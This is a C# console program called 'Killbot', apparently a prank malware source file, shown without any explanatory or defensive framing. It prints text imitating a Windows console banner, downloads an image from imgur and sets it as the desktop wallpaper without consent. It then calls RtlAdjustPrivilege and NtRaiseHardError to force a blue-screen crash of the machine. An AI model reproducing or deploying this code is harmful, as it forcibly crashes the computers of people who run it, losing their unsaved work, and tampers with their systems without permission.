using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Media;

namespace Killbot
{
    class Program
    {
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }

        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
        public static extern int SystemParametersInfo(UAction uAction, int uParam, StringBuilder lpvParam, int fuWinIni);
        static unsafe void Main(string[] args)
        {
            TypeLine("Microsoft Windows <Version 10.0.14393", 3);
            Console.WriteLine("");
            TypeLine("© Microsoft Corporation. All Rights Reserved.", 3);
            Console.WriteLine("");
            TypeLine(Environment.GetEnvironmentVariable("userprofile") + "> run killbot.exe", 3);
            Console.WriteLine("");
            TypeLine("Running program...", 3);
            Console.WriteLine("");
            Console.WriteLine("");
            Thread.Sleep(680);
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Killbot");
            string _filePath = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + "\\killbot.png";

            if (CheckForInternetConnection() == true)
            {
                using (var client = new WebClient())
                {
                    client.DownloadFile("https://i.imgur.com/hcniWVZ.jpg", _filePath);
                }
                Thread.Sleep(580);
                GetBackgroud();
                SetBackgroud(_filePath);
            }
            else
            {
                Thread.Sleep(580);
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("not connected to the internet rip");
            }
            Thread.Sleep(580);
            CRASHCOMPUTER();
        }

        static void CRASHCOMPUTER()
        {
            Boolean t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
        }

        static void TypeLine(string line, int speed)
        {
            for (int i = 0; i < line.Length; i++)
            {
                Console.Write(line[i]);
                System.Threading.Thread.Sleep(speed); // Sleep for 150 milliseconds
            }
        }

        public enum UAction
        {
            SPI_SETDESKWALLPAPER = 0x0014,
            SPI_GETDESKWALLPAPER = 0x0073,
        }
        public static string GetBackgroud()
        {
            StringBuilder s = new StringBuilder(300);
            SystemParametersInfo(UAction.SPI_GETDESKWALLPAPER, 300, s, 0);
            return s.ToString();
        }
        /// <param name="fileName">the path of image</param>
        public static int SetBackgroud(string fileName)
        {
            int result = 0;
            if (File.Exists(fileName))
            {
                StringBuilder s = new StringBuilder(fileName);
                result = SystemParametersInfo(UAction.SPI_SETDESKWALLPAPER, 0, s, 0x2);
            }
            return result;
        }

        public static bool SetOptions(string optionsName, string optionsData, ref string msg)
        {
            bool returnBool = true;
            RegistryKey classesRoot = Registry.CurrentUser;
            RegistryKey registryKey = classesRoot.OpenSubKey(@"Control Panel\Desktop", true);
            try
            {
                if (registryKey != null)
                {
                    registryKey.SetValue(optionsName.ToUpper(), optionsData);
                }
                else
                {
                    returnBool = false;
                }
            }
            catch
            {
                returnBool = false;
                msg = "Error when read the registry";
            }
            finally
            {
                classesRoot.Close();
                registryKey.Close();
            }
            return returnBool;
        }
    }
}
